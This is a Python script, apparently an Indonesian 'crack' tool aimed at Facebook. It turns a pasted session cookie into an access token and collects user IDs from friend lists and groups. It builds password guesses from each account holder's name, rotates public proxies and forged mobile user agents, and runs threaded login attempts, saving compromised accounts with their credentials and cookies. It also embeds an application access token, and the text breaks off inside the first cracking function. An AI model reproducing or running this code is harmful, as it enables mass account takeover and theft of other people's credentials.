#!/usr/bin/python3
#-*-coding:utf-8-*-
#-*-kontol-*-
#-Fajar Khafi

# JANGAN UBAH NAMA AUTHOR BANG
#RECODE BOLEH TAPI JANGAN UBAH NAMA AUTHOR 
"INSTALL MODUL"
import os
import requests,bs4,json,os,sys,random,datetime,time,re,platform,urllib3,rich,base64,uuid,subprocess
from rich.table import Table as me
from datetime import date,datetime
from time import sleep
from time import time as TimeFajar
from bs4 import BeautifulSoup as parser
from requests.exceptions import RequestException
from concurrent.futures import ThreadPoolExecutor as FajarGanteng
from rich.console import Group as gp
from rich.markdown import Markdown as mark
from time import sleep

"RICH"
from rich import print as prints
from rich.tree import Tree
from rich.panel import Panel
from rich.console import Console
from rich.panel import Panel as panel
from rich.columns import Columns
from rich.tree import Tree
from rich.text import Text as tekz
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()

"MONTH"
sasi = ["Jan", "Feb", "Mar", "Apr", "Mei", "Jun", "Jul", "Agu", "Sep", "Okt", "Nov", "Des"]
out = 'Linux-4.9.227-perf+-aarch64-with-libc'
tete = {"01": "Jan", "02": "Feb", "03": "Mar", "04": "Apr", "05": "Mai", "06": "Jun", "07": "Jul", "08": "Agu", "09": "Sep", "10": "Okt", "11": "Nov", "12": "Des"}
now = datetime.now()
hari = now.day
blx = now.month
try:
	if blx < 0 or blx > 12:exit()
	xx = blx - 1
except ValueError:exit()
#if hp not in out:exit()
bulan = sasi[xx]
tahun = now.year
tanggal = str(hari)+'-'+str(bulan)+'-'+str(tahun)
sim_ok = f'OK-{hari}-{bulan}-{tahun}.txt'
sim_cp = f'CP-{hari}-{bulan}-{tahun}.txt'
sekarang = f"{hari}-{bulan}-{tahun}.txt"

#Progress & Global Nama
sys.stdout.write('\x1b]2; ( Exynos By FAJAR )\x07')

#APPEND
dump, sandi, metode = [], [], []
pwpluss,pwnya = [],[]
opsi, proxy = [], []
data,data2,data3 = {},{},{}
tokenku=[]

#USER AGEN APPEND
ugen,ugen2 = [],[]
UbahPw = []
agen=[]
idz=[]
uid=[]
uaa=[]
ngentott = []
ugent=[]

#GKOBAL+1
Loop = 0
id, id2, loop ,ok , cp = [], [], 0, 0, 0

#SESION
ses = requests.Session()

#COLOR
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
J = "\x1b[38;5;208m" # Jingga
A = '\x1b[1;90m' # WARNA ABU ABU

BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
color = random.choice([P,M,H,K,B,U,O,Z])

#COLOR RICH
M3 = "#FF0000"
H3 = "#00FF00"
K3 = "#FFFF00"
B3 = "#00C8FF"
U3 = "#AF00FF"
N3 = "#FF00FF"
O3 = "#00FFFF"
P3 = "#FFFFFF"
J3 = "#FF8F00"
rich_gelap = random.choice([J3,M3])

#COLOR RICH
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
rich_cerah = random.choice([P2,M2,H2,B2,U2,O2,J2,A2])

try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt','w').write(prox) 
except Exception as e:
    exit(e)
   
  
for sf in range(10000):
    a = random.randrange(110,113)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(6,13)                                              
    dv_typ = random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B','SM-M315F','SM-9005',' SM-G6200'])
    bl_typ = random.choice(['PPR1','LRX21T','TP1A','RKQ1','SP1A','RP1A','QQ2A','OPM1'])
    dv_typ2 = random.choice(['MCI3B','M2102K1AC','M2101K6G','2210132C','M2007J3SG','21091116UI','M2004J19C','Redmi 6A','23028RN4DG','M2004J7AC','220233L2G','22081212UG'])
    bl_typ2 = random.choice(['TKQ1','SKQ1','TP1A','RKQ1','SP1A','RP1A','OPM1','PPR1'])
    dv_typ3 = random.choice(["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269", "RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921",'RMX3686']) #--> Device Type
    bl_typ3 = random.choice(['QP1A','SKQ1','TP1A','RKQ1','SP1A','RP1A'])
    dv_typ4 = random.choice(["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"])
    bl_typ4 = random.choice(['TKQ1','SKQ1','TP1A','RKQ1','SP1A','RP1A','OPM1','PPR1'])
    dv_ver = random.randrange(100000,250000)                                                
    sd_ver = random.randrange(1,10)                                                        
    ch_ver = f'{a}.0.{b}.{c}'                                                
    ua = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver}.{ch_ver} Mobile Safari/537.36'
    ua2 = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ2} Build/{bl_typ2}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver}.{ch_ver} Mobile Safari/537.36'
    ua3 = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ3} Build/{bl_typ3}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
    ua4 = f'Mozilla/5.0 (Linux; U; Android {os_ver}; Infinix {dv_typ4} Build/{bl_typ4}.{str(random.randrange(150000,250000))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ch_ver}.{ch_ver} Mobile Safari/537.36'
    uaku1 = random.choice([ua,ua2,ua3,ua4])
    agen.append(uaku1)
   
for x in range(20000):
      android = str(random.randint(4,9))+'.'+str(random.randint(0,1))+'.'+str(random.randint(0,1))
      fbav = str(random.randint(37,325))+".0.0."+str(random.randint(1,20))+"."+str(random.randint(40,150))
      fbbv = str(random.randint(11111111,99999999));fbrv = str(random.randint(11111111,99999999))
      build2 = ['OPM3.171019.016','OPR1.170623.032','OPM2.171019.029','OPM5.171019.017','TP1A.220905.001','QP1A.190711.020','RP1A.200720.011','SP1A.210812.016']
      merk2 = ['Lenovo TB2-X30L','ONEPLUS A5000','LGLS665','vivo Y51L','LG-M150','vivo Y21','OPPO A59s','OPPO R9 Plusm A','vivo Y71A','CPH1719','vivo Y35','vivo X20','Aquaris M5.5','vivo X6D','OPPO R11','Aquaris X5','Aquaris E5','Lenovo TB3-710','FS510','FS405','ONEPLUS A5010','NX531J','ONEPLUS A3003','LG-H870DS','Nexus 5X ','Aquaris X2']
      fbcr = str(random.choice(['TELKOMSEL','AXIS','Indosat','XL','3SinyalKuatHemat','Tsel-PakaiMasker','XL Axiata']))
      fblc = str(random.choice(['sv_SE','en_GB','en_US','es_MX','th_TH','pl_PL','id_ID']))
      fbpn = str(random.choice(['com.facebook.katana','com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.mlite','MessengerLite']))
      merk_build = str(random.choice(merk2))+'<=>'+str(random.choice(build2));merks,build2 = merk_build.split('<=>')
      large = str(random.choice(['1.0','1.5','2.0','2.5','3.0','3.5']))+'<=>'+str(random.choice(['760','750','1092','1082','650','1080']))+'<=>'+str(random.choice(['760','750','1092','1082','650','1080']));denincity,width,heigt = large.split('<=>')      
      dalvik = str(random.choice(['2.1.0','2.0.0','1.6.0','1.5.0','1.4.0','1.2.0','1.1.0']))
      ua1 = 'Dalvik/2.1.0 (Linux; U; Android  '+str(android)+'; vivo 1612 Build/NRD90M) [FBAN/MessengerLite;FBAV/'+str(fbav)+';FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/'+str(fbbv)+';FBCR/Tsel-PakaiMasker;FBMF/vivo;FBBD/vivo;FBDV/vivo 1612;FBSV/'+str(android)+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+'{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
      ua2 = 'Dalvik/'+str(dalvik)+' (Linux; U; Android '+str(android)+'; '+str(merks)+' Build/'+str(build2)+') [FBAN/FB4A;FBAV/'+str(fbav)+';FBPN/com.facebook.katana;FBDV/merek;FBSV/'+str(android)+';FBDM/{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
      ua3 = 'Dalvik/2.1.0 (Linux; U; Android '+str(android)+'; Redmi 5A Build/'+str(build2)+') [FBAN/MessengerLite;FBAV/'+str(fbav)+';FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/'+str(fbbv)+';FBCR/Tsel-PakaiMasker;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi 5A;FBSV/'+str(android)+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+'{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
      ugen2.append(str(random.choice([ua2,ua1,ua3])))

#LOGO KU
def logo2():
	try:os.system('clear')
	except:pass
	print(f"""\t{N}
 {N}╔═╗{B}─┐ ┬{U}┬ ┬{M}┌┐┌{N}┌─┐┌─┐
 {N}║╣ {B}┌┴┬┘{U}└┬┘{M}│││{N}│ │└─┐
 {N}╚═╝{B}┴ └─ {U}┴ {M}┘└┘{N}└─┘└─┘{N}""")

def Netea_терминал(platform):
    if 'win' in sys.platform:os.system('cls')
    else:os.system('clear')
    
class Jar:

	def __init__(self):
		try:os.mkdir('OK')
		except:pass
		try:os.mkdir('CP')
		except:pass
		try:os.system('touch .pox.txt')
		except:pass
		try:os.mkdir("dump")
		except:pass
		try:
			token = open('.token.txt','r').read()
			cok = open('.cok.txt','r').read()
			cookie = {"cookie":cok}
			tokenku.append(token)
			try:
				jarz = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
				khafi = json.loads(jarz.text)['name']
				khafii = json.loads(jarz.text)['id']
				menu(khafi,khafii)
			except KeyError:
				Cookies()
			except requests.exceptions.ConnectionError:
				exit()
		except IOError:
			Cookies()
		
def Cookies():
	try:
		Netea_терминал(platform)
		logo2()
		print("" )
		prints(f"[{H2}={P2}] {K2} Informasi : {P2}{M2} Harap gunakan akun tumbal{P2}\n")
		cok = console.input(f'[{H2}={P2}] masukan cookie : {H2}')
		cos = {'cookie':cok}; data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}; req  = ses.post('https://graph.facebook.com/v16.0/device/login/',data=data).json(); cd   = req['code']; ucd  = req['user_code']; url  = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038'%(cd); req  = parser(ses.get('https://mbasic.facebook.com/device',cookies=cos).content,'html.parser'); raq  = req.find('form',{'method':'post'}); dat  = {'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1), 'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(req)).group(1), 'qr' : '0', 'user_code' : ucd}; rel  = 'https://mbasic.facebook.com' + raq['action']; pos  = parser(ses.post(rel,data=dat,cookies=cos).content,'html.parser')
		dat  = {}
		raq  = pos.find('form',{'method':'post'})
		for x in raq('input',{'value':True}):
			try:
				if x['name'] == '__CANCEL__':
					pass
				else:
					dat.update({x['name']:x['value']})
			except Exception as e:
				pass
		rel = 'https://mbasic.facebook.com' + raq['action']; pos = parser(ses.post(rel,data=dat,cookies=cos).content,'html.parser'); req = ses.get(url,cookies=cos).json(); tok = req['access_token']; kot = open('.token.txt','w').write(tok); koc = open('.cok.txt','w').write(cok); masuk = console.input(f'[=] {H2}{cok}{P2}\n [{H2}={P2}] ENTER '); os.system('clear'); Jar()
	except Exception as e:
		print(e)

def res():
    exei =0
    exex =[]
    print(f'[{H}01{P}] Cek hasil akun {H}OK{P}\n[{K}02{P}] Cek hasil akun {K}CP{P}')
    ok_cp = input(' • ᴩɪʟɪʜᴀɴ ')
    if ok_cp in ['1','01']:
       print('\r')
       try:ok = os.listdir('OK')
       except:print('\n [=] File tidak ada')
       for i in ok:
           exex.append(i)
           exei +=1
           try:cek=open('OK/{}'.format(i),'r').readlines()
           except:continue
           print('  {}. {} : {} akun'.format(exei,i,len(cek)))
       file = input(f'\n  {N}[=] {N}masukan nomor : {H}')
       try:dump = exex[int(file)-1]
       except:dump=1
       try:
           ok = open('OK/{}'.format(dump),'r').read()
       except:
           print('\n [=] File tidak di temukan')
       print('\n')
       print(f'\r {H}{ok}')
       exit(0)

    elif ok_cp in ['2','02']:
       try:cp=os.listdir('CP')
       except:print('\n [=] File tidak ada')
       for i in cp:
           exex.append(i)
           exei +=1
           try:cek=open('CP/{}'.format(i),'r').readlines()
           except:continue
           print('  {}. {} : {} akun'.format(exei,i,len(cek)))
       file = input(f'\n  {N}[=] {N}masukan nomor: {H}')
       try:dump = exex[int(file)-1]
       except:dump=1
       try:
           ok = open('CP/{}'.format(dump),'r').read()
       except:
           print('\n [=] File tidak di temukan')
       print('\n')
       print(f' {K}{ok}')
       exit(0)
    else:
       Jar()
  
def ChekOption():
	print('' )
	file = input('[=] file : ')
	print("[=] sebelem melanjutkan hidupkan mode pesawat selama 10 detik")
	enter = input("[=] enter untuk melanjutkan cek opsi")
	try:cp=open('CP/'+file,'r').readlines()
	except:exit(f'\n {N}[{M}={N}] {M}File tidak ada cok!')
	for i in cp:
		asu = i.replace('\n','')
		itu = asu.split('|')
		print('{}[{}={}] {}Mengechek akun : {}|{}'.format(A,P,A,P,itu[0],itu[1]))
		cekoptionAcount(itu[0],itu[1])
	exit(f'\n {N}[{H}•{N}] {P}Proses cek akun chekpoint telah selesai...')
	Jar()
 
def cekoptionAcount(idf,pw):
    ses = requests.Session()
    url = 'mbasic.facebook.com'
    try:
         link = ses.get(f"https://{url}/login/?ref=dbl&fl&login_from_aymh=1&locale2=id_ID")
         data = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"email":idf,"pass":pw}
         posz = ses.post(f"https://{url}/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;locale2=id_ID&amp;ref=dbl",data=data)
         if "checkpoint" in ses.cookies.get_dict():
              posh = parser(posz.text,"html.parser") ; find = posh.find("form",method="post")["action"]
              data1 = {"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"',str(posz.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',str(posz.text)).group(1),"checkpoint_data":"","submit[Continue]": "Lanjutkan","nh":re.search('name="nh" value="(.*?)"',str(posz.text)).group(1),}
              zozo = ses.post(f"https://{url}{find}",data=data1) ; cari = parser(zozo.text,"html.parser")
              opsi = cari.find_all("option")
              if len(opsi) == 0:
                     if "Lihat detail login yang ditampilkan. Ini Anda?" in str(cari.find("title").text):
                     	print(f'\r • {H} Akun tap yes login di free.facebook.com atau lite')
                     	open('OK/'+sim_ok,'a').write(idf+'|'+pw+'\n')
                     elif "Masukkan Kode Masuk untuk Melanjutkan" in str(cari.find("title").text):
                     	print(f"\r{M} • {N}akun terpasang a2f	  		")
                     else:print(f'\r{M} •{N}Login eror')
              else:
                     i = 0
                     print(f'\r{H} • {N}ada {len(opsi)} opsi yang tersedia                                    {N}')
                     for ketemu in opsi:
                         i +=1
                         print(f"\r{M} • {i}. {K}{ketemu.text} {N}")

         elif "c_user" in ses.cookies.get_dict():
               cokie = (";").join(["%s=%s"%(a,b) for a,b in ses.cookies.get_dict().items()])
               print(f"\r{H}[OK] {idf}|{pw}|{cokie}")
               open('OK/'+sim_ok,'a').write(idf+'|'+pw+'|'+cokie+'\n')
         else:print(f"{N}[{M}={N}] {M}Kata sandi yang anda masukan salah.")
    except Exception as e:pass

"Setting password"
def Otomatis1():
	print()
	hasil()
	with FajarGanteng(max_workers=30) as fajar_ganteng:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv = [nmf, frs+"123", frs+"1234", frs+"12345", frs+"321",frs+"01",frs+"02",frs+"03",frs+"04",frs+"05",frs+"11",frs+"12",frs+"13",frs+"14",frs+"15",nmf.lower()]
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv = [nmf, frs+"123", frs+"1234", frs+"12345", frs+"321",frs+"01",frs+"02",frs+"03",frs+"04",frs+"05",frs+"11",frs+"12",frs+"13",frs+"14",frs+"15",nmf.lower()]
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'id_1' in metode:fajar_ganteng.submit(crack1,idf,pwv)
			elif 'id_2' in metode:fajar_ganteng.submit(crack2,idf,pwv)
			elif 'id_3' in metode:fajar_ganteng.submit(crack3,idf,pwv)
			elif 'id_4' in metode:fajar_ganteng.submit(crack4,idf,pwv)
			elif 'id_5' in metode:fajar_ganteng.submit(crack5,idf,pwv)
			else:fajar_ganteng.submit(crack1,idf,pwv)
	print('')
	exit(f'\r [{H}={P}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
	
def hasil():
	prints(f"    {H2}HASIL OK : {sim_ok}{P2}")
	prints(f"    {K2}HASIL CP : {sim_cp}{P2}\n")
	
#SETTING CRACK MASSAL
def Dumpp():
	Console().print(f'\r [=] sedang mengumpulkan {len(id2)} uid',end='');sys.stdout.flush()
	Settiing()
	
ualu,ualuh = [],[]
def Settiing():
	if len(id2)==0:
		exit('uid tidak publik')
		
	print()
	prints(f" {P2}     01. crack new \n {P2}     02. crack random")
	Fz = input(f' • ᴩɪʟɪʜᴀɴ : ')
	if Fz =='1' or Fz =='01':
		for i in id:
			id2.insert(0,i)
	elif Fz =='2' or Fz =='2':
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
			
	print()
	print(f" {P}     01. mobile {K}validate{N} \n {P}     02. mbasic {H}regularr{N} \n {P}     03. mbasic {M}validate{N} ")
	Fz = input(f' • ᴩɪʟɪʜᴀɴ : ')
	if Fz =='1' or Fz =='01':
		metode.append('id_1')
	elif Fz =='2' or Fz =='2':
		metode.append("id_2")
	elif Fz =='3' or Fz =='03':
		metode.append("id_3")
	elif Fz =='4' or Fz =='04':
		metode.append("id_4")
	elif Fz =='5' or Fz =='05':
		metode.append("id_5")

	print()
	pwplus=console.input(f'  Tambahkan Password Manual y/t :')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=console.input(f'  Masukkan Password Tambahan : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	Otomatis1()

def inpo():
	prints(f"{P2}     Author : Exynos \n{P2}     Script: Privat")
	
def menu(name,id):
	
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		cookie = {"cookie":cok}
	except IOError:
		print("cookie non aktive")
		time.sleep(5)
		Cookies()
		
	Netea_терминал(platform) 
	logo2()
	print(f" {M}----------------------{P}")
	print(f" {BM}{P} CODE BY YAM JEBEH{N}")
	print()
	print(f" {P}id : {id}")
	print(f" {P}fb : {name}")
	print()
	print(f" {P}Menu List")
	print(f" {M}--------")
	
	prints(f' 01 Crack in publik massal')
	prints(f' 02 Crack in random email  ')
	prints(f' 03 Crack in random file  ')
	prints(f' 04 Cek Option Akun  ')
	prints(f' 05 Cek Results Crack  ')
	Fajar = input(f" • ᴩɪʟɪʜᴀɴ : ")
	print("")
	if Fajar =="1" or Fajar =="01":
		user2 = console.input(' • id:')
		try:
			for uid in user2.split(','):
				data = {'fields': 'friends.fields(id,name).limit(5000)','access_token':tokenku[0]}
				for idx in requests.get('https://graph.facebook.com/'+uid+'/',params=data).json()['friends']['data']:
					if idx['id']+'|'+idx['name'] in uid:
						pass
					else:
						id2.append(idx['id']+'|'+idx['name'])
		except(KeyError)as e:
			print('[x] Cokies Mokad Kontol')
		Settiing()
		
	elif Fajar =="2" or Fajar =="02":
		x = 0
		prints(f""" [{H2}={P2}] dump search name from @gmail.com""")
		email = "@gmail.com"
		nama = input(f" {N}input name : ")
		jumlah = int(input(f" {N}input limit : "))
		for z in range(jumlah):
			x +=1
			id2.append(nama+str(x)+email+"|"+nama)
		Settiing()
		
	elif Fajar =="3" or Fajar =="03":
		file()
		
	elif Fajar =="4" or Fajar =="04":
		ChekOption()
		
	elif Fajar =="5" or Fajar =="05":
		res()
	
	elif Fajar =="6" or Fajar =="06":
		user = Console().input(' [=] Masukan uid grup :')
		for uid in user.split(','):
			if user == '' or user == ' ':
				print("[=] Jangan kosong")
			else:
				dumpgrup('https://iphone.facebook.com/groups/'+uid+'/')
		Settiing()
		
	elif Fajar =="0" or Fajar =="00":
		remove();sys.exit(' [=] LOGOUT BERHASIL')

def remove():
	try:os.remove('.cok.txt');os.remove('.token.txt')
	except:pass


def dumpgrup(url):
      try:
            links = parser(ses.get(url).text, 'html.parser')
            for respons in re.findall('data-sigil="feed_story_(.*?)class="img',str(links)):
                  for user in re.findall('ring(.*?)"',str(respons)):
                        for nama in re.findall('label="(.*?),',str(respons)):
                              if user+'|'+nama in uid:pass
                              else:id2.append(user+'|'+nama)
                              sys.stdout.write(f"\r [=] sedang mengumpulkan {str(len(id2))} id..");sys.stdout.flush()
            for x in links.find_all('a',href=True):
                  if x.text == 'Lihat Postingan Lainnya…':
                        dumpgrup('https://iphone.facebook.com'+x.get('href'))
      except(KeyError):print(' [=] Grup Bersifat Privat')

def clone():
	limit = int(input(" • input id :"))
	try:
		for n in range(limit):
			id2.append("100000"+str(random.randint(111111111,999999999)))
		print(f" • total id : {len(id2)}\n")
		with FajarGanteng(max_workers=30) as fajar_ganteng:
			for user in id2:
				fajar_ganteng.submit(crack4,user,"123456".split(","))
		exit("crack selesai")
	except Exception as e:exit(str(e))

def file():
	try:vin = os.listdir('JARS-DUMP')
	except FileNotFoundError:
		print('>> File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('')
		cetak(nel('[white][[cyan][?][white]] Jika Ingin Menggunakan Fitur Ini Ikuti Syaratnya Dibawah Ini\n[[green]1[white]] Buatlah File Dump Id Terlebih dahulu\n[[green]2[white]] Setelah Jadi Masukkan Filenya Kedalam Folder[yellow] FAJAR-DUMP[white] di Penyimpanan Internal Kalian\n[[green]3[white]] Lalu Jalankan Ulang Scriptnya! Baru Pilih Fitur Nomor[yellow] 7 [white]ini '))
		kontol = input('\n>> Apakah Anda Faham ( Y/t ) ')
		if kontol in ['']:
			print('>> Pilih Yang Bener Asuhh ')
		elif kontol in ['y','Y']:
			print(f'\n[{H}[?]{N}] Alhamdulillah Anda Sungguh Pintarr ')
			time.sleep(3)
			back()
		elif kontol in ['t','T']:
			print(f'\n[{K}x{N} Anda Sungguh Tolol ')
			time.sleep(3)
			exit()
		print('>> Anda Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('JARS-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{A} %s. %s {P} %s{A} ID '%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print('{A} %s. %s {P} %s {P}ID '%(cih,isi,len(hem)))
		geeh = input(f" • ᴩɪʟɪʜᴀɴ : ")
		try:geh = lol[geeh]
		except KeyError:
			print(f'{K}>> Pilih Yang Bener Kontol {N}')
			time.sleep(3)
			back()
		try:lin = open('JARS-DUMP/'+geh,'r').read().splitlines()
		except:
			print('>> File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id2.append(xid)
		Settiing()
		
#MENU CRACK j
#
def crack1(idf,pwv):
	global loop,ok,cp
	ua = random.choice(agen)
	ses = requests.Session()
	wae = random.choice([H,K])
	try:
		for pw in pwv:
			head={"Host": "m.facebook.com","content-length": "256","cache-control": "max-age=0","viewport-width": "980","sec-ch-ua": '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',"sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "Android","sec-ch-ua-platform-version": "9.0.0","sec-ch-ua-full-version-list": '"Google Chrome";v="113.0.5672.162", "Chromium";v="113.0.5672.162", "Not-A.Brand";v="24.0.0.0"',"sec-ch-prefers-color-scheme": "light","upgrade-insecure-requests": "1","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://m.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&wtsid=rdr_0NNmWryZ5NTSm5myO&refsrc=deprecated&ref=dbl&_rdr","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			login=parser(ses.get("https://m.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&wtsid=rdr_0NNmWryZ5NTSm5myO&refsrc=deprecated&ref=dbl&_rdr").text,"html.parser")
			for x in login("input"):data.update({x.get("name"):x.get("value"),"pass":pw})
